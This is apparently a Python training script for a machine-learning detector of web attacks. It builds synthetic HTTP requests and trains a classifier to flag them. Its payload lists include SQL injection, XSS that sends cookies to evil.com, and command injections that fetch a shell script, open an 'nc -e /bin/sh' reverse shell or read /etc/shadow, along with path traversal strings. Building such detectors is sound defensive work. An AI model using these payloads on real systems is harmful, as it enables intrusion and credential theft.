import os
import random

import features as F
import joblib
import numpy as np
from sklearn.feature_extraction.text import HashingVectorizer
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import classification_report, confusion_matrix
from sklearn.model_selection import train_test_split
from sklearn.pipeline import make_pipeline

random.seed(1337)

DATASET = os.getenv("DATASET", "dataset.csv")
MODEL_PATH = os.getenv("MODEL_PATH", "model.joblib")
FPR_TARGET = float(os.getenv("FPR_TARGET", "0.01"))

PATHS = [
    "/rest/products/search", "/api/basketitems", "/rest/user/whoami",
    "/rest/products/1/reviews", "/api/feedbacks", "/rest/user/login",
    "/profile", "/ftp", "/assets/public/images", "/rest/track-order",
    "/api/complaints", "/rest/admin/application-version", "/redirect",
]
PARAMS = ["q", "id", "search", "name", "email", "file", "path", "order", "redirect", "page"]
BENIGN_VALUES = [
    "apple", "banana juice", "cookies", "hello world", "john doe",
    "user@example.com", "product review", "12", "orange", "great service",
    "2", "/assets/logo.png", "true", "electronics", "book", "45",
]
SQLI = [
    "' or 1=1--", "admin'--", "' or '1'='1", "1' and '1'='1",
    "1 union select username,password from users", "'; drop table users;--",
    "1' and sleep(5)--", "') or ('1'='1", "1 or 1=1",
    "' union select null,version()--", "admin' or 1=1#",
    "1'; waitfor delay '0:0:5'--", "' or 'x'='x",
    "1 and (select count(*) from information_schema.tables)>0",
    "'||(select password from users limit 1)||'",
]
XSS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "<svg onload=alert(document.cookie)>", "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>", "\"><script>alert(1)</script>",
    "<body onload=alert(1)>", "<a href=javascript:alert(1)>x</a>",
    "'-alert(1)-'", "<img src=1 onmouseover=alert(1)>",
    "<script>document.location='http://evil.com/?c='+document.cookie</script>",
    "<svg><script>alert(1)</script></svg>",
]
CMDI = [
    "; cat /etc/passwd", "| whoami", "&& ls -la", "$(id)", "`uname -a`",
    "; ping -c 4 evil.com", "| curl http://evil.com",
    "; wget http://evil.com/shell.sh", "&& cat /etc/shadow",
    "; nc -e /bin/sh 10.0.0.1 4444", "| id", "; bash -i", "|| whoami",
    "$(curl evil.com)",
]
TRAVERSAL = [
    "../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
    "../../../../etc/shadow", "..\\..\\..\\windows\\system32\\config",
    "/proc/self/environ", "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd", "../../boot.ini",
    "..%252f..%252fetc%252fpasswd", "/var/www/../../etc/passwd",
]

def synth_attack(payload):
    path = random.choice(PATHS)
    param = random.choice(PARAMS)
    style = random.randint(0, 2)

    if style == 0:
        return F.build_candidate(path=path, query=f"{param}={payload}")
    if style == 1:
        return F.build_candidate(path=path, body=f'{{"{param}":"{payload}"}}')

    return F.build_candidate(path=path, query=f"{param}={payload}", ua="mozilla/5.0", referer="http://localhost/")


def synth_benign():
    path = random.choice(PATHS)
    param = random.choice(PARAMS)
    value = random.choice(BENIGN_VALUES)
    style = random.randint(0, 2)

    if style == 0:
        return F.build_candidate(path=path, query=f"{param}={value}", ua="mozilla/5.0")
    if style == 1:
        return F.build_candidate(path=path, body=f'{{"{param}":"{value}"}}')

    return F.build_candidate(path=path, ua="mozilla/5.0", referer="http://localhost/")

def synthetic_dataset():
    data, labels = [], []

    for label, payloads in [("sqli", SQLI), ("xss", XSS), ("cmdi", CMDI), ("traversal", TRAVERSAL)]:
        for _ in range(320):
            data.append(synth_attack(random.choice(payloads)))
            labels.append(label)

    for _ in range(1280):
        data.append(synth_benign())
        labels.append("benign")

    return data, labels

def load_training_data():
    if os.path.exists(DATASET):
        pass
        # data, labels = load_csv(DATASET)

    d, l = synthetic_dataset()
    return d, l, "synthetic"

def tune_threshold(model, x_eval, y_eval):
    classes = model.classes_
    proba = model.predict_proba(x_eval)
    pred = classes[proba.argmax(axis=1)]
    maxp = proba.max(axis=1)
    y_eval = np.array(y_eval)

    benign = y_eval == "benign"
    n_benign = int(benign.sum())
    fp_scores = np.sort(maxp[benign & (pred != "benign")])[::-1]
    allowed = int(np.floor(FPR_TARGET * n_benign))

    if len(fp_scores) <= allowed:
        thr = 0.5
    else:
        thr = float(min(0.99, max(0.5, fp_scores[allowed])))

    attack = np.isin(y_eval, F.ATTACK_CLASSES)
    detected = (pred != "benign") & (maxp >= thr)
    recall = float(detected[attack].mean()) if attack.sum() else 0.0
    fpr = float(detected[benign].mean()) if n_benign else 0.0
    return thr, recall, fpr

def main():
    data, labels, source = load_training_data()
    print(f"training source {source} ({len(data)} samples)", )

    x_train, x_eval, y_train, y_eval = train_test_split(
        data, labels, test_size=0.25, random_state=42, stratify=labels
    )

    pipe = make_pipeline(
        HashingVectorizer(analyzer="char_wb", ngram_range=(3, 5),
                          n_features=2 ** 18, alternate_sign=False),
        LogisticRegression(max_iter=1000, class_weight="balanced"),
    )
    pipe.fit(x_train, y_train)

    pred = pipe.predict(x_eval)
    print("\nper-class metrics")
    print(classification_report(y_eval, pred, zero_division=0))
    print("labels:", list(pipe.classes_))
    print("confusion matrix:\n", confusion_matrix(y_eval, pred, labels=list(pipe.classes_)))

    thr, recall, fpr = tune_threshold(pipe, x_eval, y_eval)
    print("\n=== threshold tuning (target benign FPR {:.1%}) ===".format(FPR_TARGET))
    print("recommended ml_score: {:.3f}".format(thr))
    print("attack recall at threshold: {:.3f}".format(recall))
    print("benign FPR at threshold:    {:.3f}".format(fpr))
    with open("threshold.txt", "w") as fh:
        fh.write("{:.3f}\n".format(thr))

    pipe.fit(data, labels)
    joblib.dump(pipe, MODEL_PATH)
    print(f"\nsaved {MODEL_PATH} (refit on all {len(data)} samples)")

if __name__ == "__main__":
    main()
